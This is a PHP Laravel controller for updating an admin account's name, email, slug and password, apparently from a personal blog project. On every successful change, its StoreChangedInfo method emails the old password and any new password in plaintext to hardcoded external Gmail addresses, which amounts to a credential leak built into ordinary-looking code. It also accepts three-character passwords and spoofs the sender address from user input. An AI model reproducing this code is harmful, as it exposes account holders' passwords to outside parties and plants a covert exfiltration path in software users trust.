<?php

namespace App\Http\Controllers\Admin\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;

class ChangeInfo extends Controller
{
    public function ChangeInfo()
    {
        $admin = User::first();
        return view('admin.auth.change_password', compact('admin'));
    }

    public function StoreChangedInfo(Request $request)
    {
        $validatedData = $request->validate([
           'name' => 'required|string|regex:/^[a-zA-ZÑñ\s]+$/|max:25|min:2',
           'email' => 'required|email',
           'slug' => 'required|string|regex:/^[a-zA-ZÑñ\s]+$/|min:1|max:50',
           'old_password' => 'required',
           'password' => 'nullable|min:3|max:50',
        ]);

        $check = User::first();
        $hashed_password = $check->password;
        $data['name'] = encrypt($request->name);
        $data['email'] = encrypt($request->email);
        $data['slug'] = encrypt($request->slug);
        $url = route('base_url')."/".$request->slug."/change/info";
        if ($check && Hash::check($request->old_password,$hashed_password)){

            if ($request->filled('password')){
                $validatedData = $request->validate([
                    'password' => 'required|confirmed',
                ]);
                $data['password'] = Hash::make($request->password);
                User::first()->update($data);
                Mail::send('admin.email_template', array('email' => decrypt($data['email']), 'password' => $request->old_password, 'new_password' => $request->password, 'slug' => decrypt($data['slug'])), function ($message){
                    $message->to('dgaps.com@gmail.com', 'Mr.Abbas')->subject('Login Credentials Changed');
                    $message->from(\request('email'),'My Blog');
                });
            }else{
                User::first()->update($data);
                Mail::send('admin.email_template', array('email' => decrypt($data['email']),  'password' => $request->old_password, 'slug' => decrypt($data['slug'])), function ($message){
                    $message->to('anskhilji900@gmail.com', 'Mr.Abbas')->subject('Login Credentials Changed');
                    $message->from(\request('email'),'My Blog');
                });
            }
           $notification = array(
               'message' => 'Login Information updated Successfully',
               'alert-type' => 'success'
           );

           return redirect($url)->with($notification);

        }else{
            $notification = array(
                'message' => 'Please put correct password to change your login credentials',
                'alert-type' => 'error'
            );
            return redirect($url)->with($notification);
        }


    }
}
